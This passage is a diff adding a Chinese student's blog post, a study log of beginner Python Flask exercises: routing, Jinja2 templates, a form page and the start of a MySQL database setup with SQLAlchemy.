@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="不知道在学什么">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023暑期学习记录week3">
+<meta property="og:url" content="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/index.html">
+<meta property="og:site_name" content="LinTu&#39;s Blog">
+<meta property="og:description" content="不知道在学什么">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64c7bbc91ddac507cc154fb2.jpg">
+<meta property="article:published_time" content="2023-07-27T12:48:01.000Z">
+<meta property="article:modified_time" content="2023-08-02T14:57:18.805Z">
+<meta property="article:author" content="林涂">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg">
+
+<link rel="canonical" href="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2023暑期学习记录week3 | LinTu's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="LinTu's Blog" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LinTu's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="林涂">
+      <meta itemprop="description" content="学习ing">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LinTu's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023暑期学习记录week3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-27 20:48:01" itemprop="dateCreated datePublished" datetime="2023-07-27T20:48:01+08:00">2023-07-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-02 22:57:18" itemprop="dateModified" datetime="2023-08-02T22:57:18+08:00">2023-08-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习日记</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/" class="post-meta-item leancloud_visitors" data-flag-title="2023暑期学习记录week3" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>不知道在学什么</p>
+<span id="more"></span>
+<h1 id="Python-Flask框架学习"><a href="#Python-Flask框架学习" class="headerlink" title="Python Flask框架学习"></a>Python Flask框架学习</h1><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000017330435">前端 - Python Flask框架：零基础web开发入门教程 - 个人文章 - SegmentFault 思否</a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>pip install flask</code></p>
+<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment"># 引入Flask类</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 创建Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编写主程序</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="comment"># 在主程序中，执行run()来启动应用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#改名启动一个本地服务器</span></span><br><span class="line"><span class="comment"># 默认情况下其地址是localhost:5000</span></span><br><span class="line"><span class="comment">#在上面的代码中，我们使用关键字参数port将监听端口修改为8080。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,port=<span class="number">8080</span>)</span><br><span class="line"><span class="comment"># 使用app变量的route()装饰器来告诉Flask框架URL如何触发我们的视图函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行    $ python app.py</span></span><br></pre></td></tr></table></figure>
+<p>一开始一直404后来才发现是缩进错误。。</p>
+<h2 id="使用HTML模板"><a href="#使用HTML模板" class="headerlink" title="使用HTML模板"></a>使用HTML模板</h2><ul>
+<li>定义了一个名为 user 的字典<br><code>user = &#123;&#39;username&#39;: &#39;John&#39;, &#39;age&#39;: &quot;20&quot;&#125;</code></li>
+<li>使用拼接的HTML字符串来展示 user 字典的数据<br><code>&lt;h1&gt;Hello, &#39;&#39;&#39; + user[&#39;username&#39;] + &#39;&#39;&#39;!, you’re &#39;&#39;&#39; + user[&#39;age&#39;] + &#39;&#39;&#39; years old.&lt;/h1&gt;</code></li>
+</ul>
+<p>拼接HTML字符串<strong>非常</strong>容易出错,<br>因此Flask使用Jinja 2模板引擎来分离数据逻辑和展示层。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apps folder</span><br><span class="line">/app.py</span><br><span class="line">templates</span><br><span class="line">   |-/index.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;Alex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &#123;% if name %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用表单"><a href="#使用表单" class="headerlink" title="使用表单"></a>使用表单</h2><p>e.g.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apps folder</span><br><span class="line">/app.py</span><br><span class="line">templates</span><br><span class="line">   |-/bio_form.html</span><br><span class="line">   |-/show_bio.html</span><br></pre></td></tr></table></figure>
+<p>app.py 文件</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/form&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bio_data_form</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        age = request.form[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">        email = request.form[<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">        hobbies = request.form[<span class="string">&#x27;hobbies&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;showbio&#x27;</span>,</span><br><span class="line">                                username=username,</span><br><span class="line">                                age=age,</span><br><span class="line">                                email=email,</span><br><span class="line">                                hobbies=hobbies))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bio_form.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showbio&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showbio</span>():</span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    email = request.args.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    hobbies = request.args.get(<span class="string">&#x27;hobbies&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;show_bio.html&quot;</span>,</span><br><span class="line">                           username=username,</span><br><span class="line">                           age=age,</span><br><span class="line">                           email=email,</span><br><span class="line">                           hobbies=hobbies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>bio_form.html 文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio Data Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;bio_data_form&#x27;) &#125;&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Hobbies<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>show_bio.html 文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Username: &#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Age: &#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Email: &#123;&#123; email &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hobbies: &#123;&#123; hobbies &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库集成：使用SQLAlchemy"><a href="#数据库集成：使用SQLAlchemy" class="headerlink" title="数据库集成：使用SQLAlchemy"></a>数据库集成：使用SQLAlchemy</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p><code>pip install flask-sqlalchemy</code></p>
+<p>然后教程给的是postgresql，但是我研（请）究（教）了（chat）一（老）下（师），感觉用mysql能凑合大部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">只有在特定情况下，您才需要考虑使用PostgreSQL，比如：</span><br><span class="line"></span><br><span class="line">数据库需求：某些特殊应用场景或者要求可能更适合使用PostgreSQL的一些高级功能，例如支持JSON数据类型、全文搜索等。</span><br><span class="line"></span><br><span class="line">学习目的：如果您是为了学习和了解不同的数据库后端，或者想要学习使用PostgreSQL和Flask-SQLAlchemy，那么使用PostgreSQL可能是有意义的。</span><br><span class="line"></span><br><span class="line">其他项目需求：如果您在其他项目中需要使用PostgreSQL，那么在Flask应用程序中也选择使用PostgreSQL可能会更方便统一数据库后端。</span><br></pre></td></tr></table></figure>
+
+<p>找了个用MySQL的<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/146874556">Python Web 开发框架Flask快速入门 - 知乎</a><br><code>pip install flask-mysqldb</code></p>
+<h3 id="使用-最基础版🚬🚬"><a href="#使用-最基础版🚬🚬" class="headerlink" title="使用(最基础版🚬🚬)"></a>使用(最基础版🚬🚬)</h3><p>老报错，，gpt🙏🙏🙏</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-sql.py</span><br><span class="line">templates/</span><br><span class="line"><span class="code">    index.html</span></span><br></pre></td></tr></table></figure>
+
+<p>flask-sql.py文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置连接数据库的URL</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;mysql://root:root@127.0.0.1:3306/Flask_test&#x27;</span></span><br><span class="line"><span class="comment"># 第一个root是用户名，第二个root是密码</span></span><br><span class="line"><span class="comment"># 